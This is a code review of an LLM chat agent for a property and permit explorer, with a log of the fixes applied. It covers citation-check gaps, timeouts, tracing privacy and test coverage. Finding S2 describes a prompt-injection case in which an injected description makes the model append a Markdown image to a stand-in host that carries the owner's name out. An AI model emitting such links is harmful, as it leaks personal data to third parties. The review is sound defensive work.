# Alakazam review: T9 chat agent (faf96aa..b75dab1)

One blocker, four should-fix. `packages/contract` (so `openapi.json`) is identical to faf96aa; the response and the
`400`/`413`/`503` bodies match the contract.

## Blocker

**B1. Model-written assumptions bypass the citation check and survive a withheld answer.** `apps/api/src/chat/turn.ts:281`
checks only `answer`; lines 259, 279, 284, 296 return `parsed.assumptions`. Scenario: `ASSUMPTION: same homes as
[[property:114347]] earlier` ships an id from history in `assumptions[]`; when the answer fails, the `tool_error` response
still carries model text. Fix: check `[...parsed.assumptions, answer].join('\n')`; drop model assumptions on every
`tool_error`.

## Should-fix

**S1. Ids outside `[[…]]` are unchecked** (`citations.ts:14-45`). Scenario: turn 2 only resolves Austin, then writes
"permit 1981-013092 BP has been open 45 years" from turn 1: it passes as `answered`. Same for a Markdown link to
`/v1/permits/…`, which the explorer allows. Fix: also check bare permit ids (`\b\d{4}-\d{6} [A-Z]{2}\b`), 32-hex
contractor keys and API-path ids in link targets; or strip links (the prompt forbids them).

**S2. "No HTML, no images" is prompt-only** (`turn.ts:274-300`). Scenario: an injected description makes the model
append `![](https://x.example/?d=<owner>)` in a personal turn; the explorer drops it, the CRM renders it. Fix: fail
closed when the answer matches `/<[a-z!/]|!\[/i`.

**S3. Pre-turn awaits sit outside the deadline and the `try`** (`handlers/chat.ts:211-215`). The SSM (`chat.ts:35`) and
Secrets Manager (`langsmith.ts:95`) clients have no request timeout: a stalled call runs to the 28 s Lambda timeout and
returns a gateway `5xx`, not `limit_reached`. If `deps.queries()` rejects during a half-open probe, `probing` stays true
(`governor.ts:183`) and the instance answers `503 circuit_open` until recycled. Fix: move line 215 into the `try`,
release the probe in `finally`, race the facade against ~1.5 s (plain fallback), `requestTimeout: 1000, maxAttempts: 2`
on both clients.

**S4. Earlier turns' person data reaches LangSmith.** `personValues` lives one turn (`chat.ts:252`); `hidePersonFields`
(`langsmith.ts:58-77`) otherwise hides by JSON key only. Scenario: turn 1 "who owns 114347?" names the owner; turn 2 "and
its roof?" is not personal, and its traced input holds turn 1's answer verbatim. Fix: in `hideInputs`, replace every
message but the last with its SHA-256.

## Notes

- **Deviation (1) is sound at the id level**: a permit record returns the property id, the chip links
  `/v1/properties/{id}`, `record_cid` stays the permit's. A turn-1 roof age restated under a permit-backed citation still
  passes; that is inherent to id-level checking.
- **Time budget** otherwise holds: abort at 23.5 s, per-step `AbortSignal.timeout`, raced tools, one retry only with
  ≥ 1.9 s left, flush ≤ min(2 s, deadline − 0.5 s); turns end by about 25 s.
- **Prewarm** is within the contract (`400 invalid_params`) and costs one token of burst 5 (refilled in 2.5 s). It fires
  on every Agent-tab mount (`App.tsx:73`, `Agent.tsx:219`), not once per page load, and every 400 and warm-up counts toward
  the 200-a-day invocation alarm (`api-stack.ts:424`) that trips the kill switch. Fix: a module-level once flag; alarm on
  `ChatTurns`.
- **Golden set** covers every section-20 category, but expected ids come from the tools' own query functions
  (`golden-build.ts:73,94,132`), so id recall measures parameters only; `gateCitations` (`golden.ts:193`) shares B1/S1's
  blind spots; result files omit `prompt_version`. The live replay is still owed.
- **SAM events** carry `timeEpoch: 0` (`sam/events/*.json:25`): a raw `sam local invoke -e` gives instant `limit_reached`.
  Treat a stale `timeEpoch` as now.
- No test parses a turn body with the frozen `ChatResponse` schema; add one to `chat.test.ts`.
- Kit conformance otherwise passes: the facade (bounded flush, graceful degrade with a 5-minute retry, session =
  `session_id` or request id, key never in env), cache middleware with logged tokens and metadata keys, `ToolLoopAgent`
  through the facade with `maxRetries: 0` and `stopWhen`, chat-only Bedrock, secret and flag grants in CDK tests.

## Applied (2026-10-20, T9 fix pass; decisions.md section 32)

- **B1.** The citation check runs over the model's assumption lines and the answer together; every `tool_error` returns no
  model text (no answer, no model assumptions; the server's assumptions and limitations stay). Tests: an assumption citing a
  history id, and a bare id from history, both give `tool_error` with no model text.
- **S1.** Validated against this turn's evidence, failing closed otherwise: bare permit ids (also with a hyphen or no
  separator), 32-hex contractor keys and business or license record ids, "property <id>" mentions, and ids in `/v1/...`
  paths of link targets. Tested both ways; counts and dates stay allowed. The golden runner's gate checks the same.
- **S2.** The server strips HTML tags, comments, autolinks and Markdown images from the answer and the assumptions, keeps
  links only to the request's API host, `ipfs.filebase.io`, `gateway.pinata.cloud` and `#/` explorer routes (other links
  keep their text; other bare URLs are removed), then runs the check. Tested.
- **S3.** The flag read, the tracing facade and the data open run inside the deadline and the `try` (1.5 s bounds, the open
  by the deadline); SSM and Secrets Manager clients use 1 s request and connection timeouts and two attempts; a failed
  secret read turns tracing off for the instance; a turn that ends without reporting releases the half-open probe.
  Tested: a never-answering flag read, a failing secret read, and an open failure during a probe followed by a normal
  turn. A missing or stale `timeEpoch` counts as now, so the SAM events' `timeEpoch: 0` no longer gives instant
  `limit_reached`.
- **S4.** Every earlier message of the client-sent history is replaced in traced inputs by `[earlier message sha256:…]`.
  Tested.
- **Notes.** Prewarm: at most once per 5 minutes per browser session; decisions 32 says prewarms and warm-ups count toward
  the daily invocation limit; alarming on `ChatTurns` instead is left to the operator. Golden set: the README conversation
  and two new state-suffix cases take their expected ids from independent SQL over the serving Parquet files (equal to the
  query layer); result files record `prompt_version`. A test parses a turn body with the frozen `ChatResponse` schema.
  Sonnet 4.6 run 3: hard gates 26/26, outcome accuracy 1.000, p95 14.3 s.
